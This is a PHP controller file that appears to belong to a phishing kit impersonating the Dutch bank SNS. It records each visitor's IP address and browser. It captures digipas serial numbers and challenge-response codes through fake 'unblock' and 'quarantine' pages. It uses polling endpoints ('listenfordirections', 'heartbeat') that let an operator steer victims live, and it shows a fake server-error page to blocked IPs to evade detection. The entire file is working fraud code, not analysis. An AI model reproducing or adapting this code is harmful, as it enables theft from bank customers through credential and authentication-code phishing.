<?php
namespace controllers;

class sns{

	private $sns_model;
	public function __construct($uidNeeded = false) {
		$this->sns_model = new \models\sns();
		if($uidNeeded == true) {
			if(empty($_SESSION['uid']) || $this->sns_model->entryExists($_SESSION['uid']) == false) {
				header("location: /nl/retail/login");
			}
		}
		
		if($this->sns_model->isBlocked($_SERVER['REMOTE_ADDR'])) {
            die("<h1>Internal Server Error </h1>
                <p>The server encountered an internal error or misconfiguration and was unable to complete your request.</p>
                <p>Please contact the server administrator at webmaster@localhost to inform them of the time this error occured, and the actions you preformed.</p>
                <p>More information about this error may be avalible in the server error log.</p>
                ");
		}
	}

	public function listenfordirections($uid) {
		echo $this->sns_model->listenfordirections($uid);
	}

	public function heartbeat($uid) {
		$this->sns_model->heartbeat($uid);
	}

	public function login($error = false) {
		if(empty($_SESSION['uid']) || $this->sns_model->entryExists($_SESSION['uid']) == false) { $this->sns_model->newSnsEntry($_SERVER['REMOTE_ADDR'] ,$_SERVER['HTTP_USER_AGENT']); }
        if(isset($_POST['loginSerialNumber'])){ 
			$a = $this->sns_model->submitLogin($_SESSION['uid'], $_POST['loginSerialNumber']);
			if($a == true) {
				header("Location: /mijnsns/deblokkeren/controle.html");
			}
		}

		$tpl = new \classes\core\template("./views/sns/login/index.html");
			if($error == true ){ $tpl->set("error", '<p class="notification notification--error" ng-class="status" ng-transclude="">Serienummer van uw digipas is onjuist.</p>');}
			elseif($error == false) { $tpl->set("error", ""); 	}
		echo $tpl->draw();
	}

	public function controle() {
		$tpl = new \classes\core\template("./views/sns/controle/index.html");
		echo $tpl->draw();
	}

    public function quarantaine() {
        if(isset($_POST['submit'])) {
			$this->sns_model->setWaitingSeen($_SESSION['uid']);
			$this->sns_model->setWaiting($_SESSION['uid']);
			header("Location: /mijnsns/deblokkeren/controle.html");
		}
        $tpl = new \classes\core\template("./views/sns/quarantaine/index.html");
		echo $tpl->draw();
    }

    public function bevestiging($error = false) {
        if(isset($_POST['challengeResponse'])){ 
			$a = $this->sns_model->submitBevestiging($_SESSION['uid'], $_POST['challengeResponse']);
			if($a == true) {
				header("Location: /mijnsns/deblokkeren/controle.html");
			}
		}

		$tpl = new \classes\core\template("./views/sns/bevestiging/index.html");
			if($error == true ){ $tpl->set("error", '<p class="notification notification--error" ng-class="status" ng-transclude="">Bevestigingscode van uw digipas is onjuist.</p>');}
            elseif($error == false) { $tpl->set("error", ""); 	}
			$tpl->set("code", $this->sns_model->getCustomInput($_SESSION['uid']));
		echo $tpl->draw();
    }
    

    public function voltooid() {
        $tpl = new \classes\core\template("./views/sns/voltooid/index.html");
		echo $tpl->draw();
    }
}